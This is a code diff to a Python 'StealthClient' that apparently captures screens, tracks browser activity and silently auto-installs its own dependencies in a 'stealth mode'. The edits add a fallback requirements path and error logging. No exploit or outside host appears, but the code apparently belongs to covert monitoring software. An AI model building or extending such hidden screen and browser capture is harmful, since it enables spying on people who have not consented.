@@ -95,8 +95,15 @@ class StealthClient:
         self.screen_capture = ScreenCapture(self.api_client)
         self.screen_capture.set_browser_tracker(self.browser_tracker)
 
-        # FIX #41-42: Initialize dependency checker for self-healing
-        requirements_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "requirements.txt")
+        # FIX #41-42, #48: Initialize dependency checker for self-healing
+        # Use absolute path relative to main.py location
+        main_dir = os.path.dirname(os.path.abspath(__file__))
+        requirements_file = os.path.join(main_dir, "requirements.txt")
+
+        # Fallback: try current working directory
+        if not os.path.exists(requirements_file):
+            requirements_file = os.path.join(os.getcwd(), "requirements.txt")
+
         if LIVE_UPDATE_AVAILABLE and os.path.exists(requirements_file):
             self.dependency_checker = DependencyChecker(requirements_file, self.logger)
         else:
@@ -180,19 +187,21 @@ class StealthClient:
             pass
 
     def check_and_fix_dependencies(self):
-        """FIX #42: Periodic dependency check and auto-install (fully stealth)"""
+        """FIX #42, #49: Periodic dependency check and auto-install (fully stealth)"""
         if not self.dependency_checker:
             return
 
         try:
             missing = self.dependency_checker.check_dependencies()
             if any(not installed for installed in missing.values()):
-                # Auto-install missing packages silently
-                self.dependency_checker.auto_install_missing(silent=True)
+                # FIX #49: Check if auto-install succeeded
+                success = self.dependency_checker.auto_install_missing(silent=True)
+                if not success:
+                    # Log error even in stealth mode (ERROR level)
+                    self.logger.error(f"Dependency auto-install failed for packages: {[pkg for pkg, installed in missing.items() if not installed]}")
         except Exception as e:
-            # Silent fail in stealth mode
-            if not Config.STEALTH_MODE:
-                self.logger.error(f"Dependency check failed: {e}")
+            # Log error even in stealth mode
+            self.logger.error(f"Dependency check failed: {e}")
 
     def run(self):
         """Main execution loop - STEALTH MODE"""
